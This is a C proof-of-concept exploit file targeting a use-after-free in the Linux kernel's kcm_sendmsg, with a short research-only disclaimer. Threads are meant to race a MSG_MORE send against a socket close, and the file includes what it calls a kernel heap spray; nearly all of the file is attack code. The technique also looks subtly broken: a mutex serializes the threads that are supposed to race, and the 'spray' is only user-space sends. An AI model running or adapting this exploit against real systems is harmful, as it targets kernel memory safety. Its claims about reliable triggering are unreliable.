/*
 * Advanced Linux Kernel kcm_sendmsg UAF Exploit PoC
 *
 * Description:
 * This PoC exploits a UAF vulnerability in the kcm_sendmsg function by creating
 * a sophisticated race condition between multiple threads. The scenario simulates
 * concurrent access and resource manipulation, triggering the UAF with higher
 * reliability.
 *
 * Note: This PoC is intended for research and educational purposes only.
 * Unauthorized use is illegal and unethical.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <linux/kcm.h>
#include <errno.h>

// Global variables for synchronization and shared resources
pthread_mutex_t mutex;
int sockfd;
char *spray_buffer;

// Helper function to create and configure a KCM socket
int create_kcm_socket() {
    int sock = socket(AF_KCM, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }
    return sock;
}

// Function to spray kernel heap with controlled data
void kernel_heap_spray() {
    spray_buffer = (char *)malloc(4096);
    memset(spray_buffer, 'A', 4096);

    for (int i = 0; i < 1000; i++) {
        send(sockfd, spray_buffer, 4096, MSG_MORE);
    }
}

// Function to prepare and send a controlled message
void send_controlled_message(int sockfd, const char *message, int flags) {
    struct msghdr msg;
    struct iovec iov;

    iov.iov_base = (void *)message;
    iov.iov_len = strlen(message) + 1;

    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    if (sendmsg(sockfd, &msg, flags) == -1) {
        perror("sendmsg");
    }
}

// Thread A: Sends a crafted message with MSG_MORE to trigger the UAF
void *thread_a_func(void *arg) {
    pthread_mutex_lock(&mutex);

    const char *msg_a = "Thread A: Crafting the UAF condition";

    // Send a controlled message with MSG_MORE
    send_controlled_message(sockfd, msg_a, MSG_MORE);

    // Introduce a precise delay to manipulate the race condition
    usleep(5000);

    pthread_mutex_unlock(&mutex);
    return NULL;
}

// Thread B: Concurrently sprays the heap and sends a message
void *thread_b_func(void *arg) {
    pthread_mutex_lock(&mutex);

    kernel_heap_spray();  // Spray the heap with controlled data

    const char *msg_b = "Thread B: Finalizing the message";

    // Send a complete message to race with Thread A
    send_controlled_message(sockfd, msg_b, 0);

    pthread_mutex_unlock(&mutex);
    return NULL;
}

// Thread C: Attempts to free resources while Thread A and B are in progress
void *thread_c_func(void *arg) {
    usleep(4500);  // Delay slightly to overlap with A and B

    // Close the socket to trigger UAF and potential double-free
    close(sockfd);

    return NULL;
}

// Thread D: Creates additional network load to increase unpredictability
void *thread_d_func(void *arg) {
    int tmp_sockfd = create_kcm_socket();
    for (int i = 0; i < 100; i++) {
        send_controlled_message(tmp_sockfd, "Thread D: Creating noise", 0);
    }
    close(tmp_sockfd);

    return NULL;
}

int main() {
    pthread_t thread_a, thread_b, thread_c, thread_d;

    // Create and initialize KCM socket
    sockfd = create_kcm_socket();

    // Initialize the mutex for synchronization
    pthread_mutex_init(&mutex, NULL);

    // Create threads to simulate the race condition and exploit UAF
    pthread_create(&thread_a, NULL, thread_a_func, NULL);
    pthread_create(&thread_b, NULL, thread_b_func, NULL);
    pthread_create(&thread_c, NULL, thread_c_func, NULL);
    pthread_create(&thread_d, NULL, thread_d_func, NULL);

    // Wait for all threads to finish execution
    pthread_join(thread_a, NULL);
    pthread_join(thread_b, NULL);
    pthread_join(thread_c, NULL);
    pthread_join(thread_d, NULL);

    // Clean up and release resources
    pthread_mutex_destroy(&mutex);
    free(spray_buffer);

    printf("Super Mega Modified PoC completed. Inspect kernel logs for UAF traces.\n");

    return 0;
}
